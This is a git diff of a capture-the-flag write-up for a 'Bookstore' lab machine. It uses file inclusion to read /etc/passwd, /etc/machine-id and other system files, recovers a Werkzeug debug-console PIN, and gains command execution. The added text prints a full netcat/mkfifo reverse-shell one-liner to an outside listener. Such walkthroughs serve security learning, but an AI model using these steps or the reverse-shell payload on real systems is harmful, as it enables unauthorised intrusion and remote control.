@@ -5,7 +5,7 @@ grand_parent: Pwn Counter
 nav_order: 32
 ---
 
-# CMesS
+# Bookstore
 
 
 
@@ -73,9 +73,28 @@ This error message also had a console feature that allowed commands to be run on
 
 Googling on how to bypass this pin, I found this [hacktricks article](https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/werkzeug.html) on how to do just that listing that I needed the username of the user running flask, the full path to the flask app, the mac address, and device id
 
-I checked the current UID and GUID by reading ```/proc/self/status``` and then cross referencing those values in ```/etc/passwd``` and found the user ```sid``` was running the flask app. Found the full path of the flask app which was ```/usr/lib/python3/dist-packages/flask/app.py```. Found the MAC Address by reading the active network interface from ```/proc/net/arp``` and then reading ```sys/class/net/ens5/address``` to get the MAC address of ```0a:ff:f1:73:c4:eb ```.
+I checked the current UID and GUID by reading ```/proc/self/status``` and then cross referencing those values in ```/etc/passwd``` and found the user ```sid``` was running the flask app. Found the full path of the flask app which was ```/usr/lib/python3/dist-packages/flask/app.py```. Found the MAC Address by reading the active network interface from ```/proc/net/arp``` and then reading ```sys/class/net/ens5/address``` to get the MAC address of ```0a:ff:f1:73:c4:eb ```, and then converted it into decimal format using python which gave me ```
+12094383834347```. Finally, I got the machine id of ```d86a656616e9492d93f4ab7905f44292``` by reading ```/etc/machine-id```.
 
+Having all this information, I used the script provided and filled in the information I had gathered and hoped for the best.
 
+And it didnt work. Oh well.
+
+I went back to the drawing board and thought about any other useful information I could gleam from LFI. I remembered that since I knew the user of the flask app, I could try and check the bash history since when you start up a flask app it prints the code to stdout.
+
+<img width="1015" height="119" alt="image" src="https://github.com/user-attachments/assets/15d010cd-73a7-401d-baa5-1ddcacf57dc8" />
+
+And as simple as that. Not for the reason I thought but a win is a win.
+
+### Debug Console Access
+
+Using the following command found on the hacktricks article to execute system commands, we have achieved RCE. Sweeeetttttt.
+
+<img width="1887" height="164" alt="image" src="https://github.com/user-attachments/assets/5acccf29-5ecb-4fd4-9964-b46cd4733649" />
+
+I wanted to get a reverse shell so I wouldn't have to do all my work from this console so I used the command ```__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.130.135 1337 >/tmp/f').read();``` and got a callback on my listener, nice.
+
+<img width="531" height="116" alt="image" src="https://github.com/user-attachments/assets/6ada7b42-26ef-4937-a26c-9a91bc1bb7b6" />
 
 
 
